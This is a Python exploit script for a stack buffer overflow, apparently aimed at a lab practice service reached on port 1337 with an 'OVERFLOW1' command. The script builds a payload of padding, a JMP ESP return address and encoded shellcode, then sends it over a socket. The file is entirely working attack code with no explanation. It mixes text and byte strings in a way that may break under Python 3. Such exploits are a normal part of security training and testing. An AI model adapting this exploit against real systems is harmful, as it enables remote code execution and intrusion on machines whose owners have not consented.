#! /usr/bin/python
import socket, time, sys

host = "10.10.157.191"
port = 1337
t = 5
offset = 1978
length = 4000

badchars = [0x00, 0x0A, 0x0D, 0x07, 0x08, 0x2E, 0x2F, 0xA0, 0xA1]


shellcode = ""
shellcode += "A" * offset
shellcode += "\xaf\x11\x50\x62" #Saved Return Pointer 0x625011af=JMP ESP
shellcode += "\x83\xec\x10" #sub esp, 0x10
shellcode += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x1b\x9e\x9f\xb7\x83\xee\xfc"
shellcode += b"\xe2\xf4\xe7\x76\x1d\xb7\x1b\x9e\xff\x3e\xfe"
shellcode += b"\xaf\x5f\xd3\x90\xce\xaf\x3c\x49\x92\x14\xe5"
shellcode += b"\x0f\x15\xed\x9f\x14\x29\xd5\x91\x2a\x61\x33"
shellcode += b"\x8b\x7a\xe2\x9d\x9b\x3b\x5f\x50\xba\x1a\x59"
shellcode += b"\x7d\x45\x49\xc9\x14\xe5\x0b\x15\xd5\x8b\x90"
shellcode += b"\xd2\x8e\xcf\xf8\xd6\x9e\x66\x4a\x15\xc6\x97"
shellcode += b"\x1a\x4d\x14\xfe\x03\x7d\xa5\xfe\x90\xaa\x14"
shellcode += b"\xb6\xcd\xaf\x60\x1b\xda\x51\x92\xb6\xdc\xa6"
shellcode += b"\x7f\xc2\xed\x9d\xe2\x4f\x20\xe3\xbb\xc2\xff"
shellcode += b"\xc6\x14\xef\x3f\x9f\x4c\xd1\x90\x92\xd4\x3c"
shellcode += b"\x43\x82\x9e\x64\x90\x9a\x14\xb6\xcb\x17\xdb"
shellcode += b"\x93\x3f\xc5\xc4\xd6\x42\xc4\xce\x48\xfb\xc1"
shellcode += b"\xc0\xed\x90\x8c\x74\x3a\x46\xf6\xac\x85\x1b"
shellcode += b"\x9e\xf7\xc0\x68\xac\xc0\xe3\x73\xd2\xe8\x91"
shellcode += b"\x1c\x61\x4a\x0f\x8b\x9f\x9f\xb7\x32\x5a\xcb"
shellcode += b"\xe7\x73\xb7\x1f\xdc\x1b\x61\x4a\xe7\x4b\xce"
shellcode += b"\xcf\xf7\x4b\xde\xcf\xdf\xf1\x91\x40\x57\xe4"
shellcode += b"\x4b\x08\xdd\x1e\xf6\x95\xbf\x1d\x46\xf7\xb5"
shellcode += b"\x1b\x9e\xcf\x3e\xfd\xf4\x8f\xe1\x4c\xf6\x06"
shellcode += b"\x12\x6f\xff\x60\x62\x9e\x5e\xeb\xbb\xe4\xd0"
shellcode += b"\x97\xc2\xf7\xf6\x6f\x02\xb9\xc8\x60\x62\x73"
shellcode += b"\xfd\xf2\xd3\x1b\x17\x7c\xe0\x4c\xc9\xae\x41"
shellcode += b"\x71\x8c\xc6\xe1\xf9\x63\xf9\x70\x5f\xba\xa3"
shellcode += b"\xb6\x1a\x13\xdb\x93\x0b\x58\x9f\xf3\x4f\xce"
shellcode += b"\xc9\xe1\x4d\xd8\xc9\xf9\x4d\xc8\xcc\xe1\x73"
shellcode += b"\xe7\x53\x88\x9d\x61\x4a\x3e\xfb\xd0\xc9\xf1"
shellcode += b"\xe4\xae\xf7\xbf\x9c\x83\xff\x48\xce\x25\x7f"
shellcode += b"\xaa\x31\x94\xf7\x11\x8e\x23\x02\x48\xce\xa2"
shellcode += b"\x99\xcb\x11\x1e\x64\x57\x6e\x9b\x24\xf0\x08"
shellcode += b"\xec\xf0\xdd\x1b\xcd\x60\x62"
shellcode += "D" * (length - len(shellcode))

try:
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.settimeout(t)
    con = soc.connect((host, port))
    soc.recv(1024)
    print("Fuzzing with {} with length {}".format(shellcode, len(shellcode)))
    soc.send("OVERFLOW1 {}\r\n".format(shellcode)) #Change Command
    soc.recv(1024)
    soc.close()
except Exception as e:
    print(str(e))
    sys.exit(0)
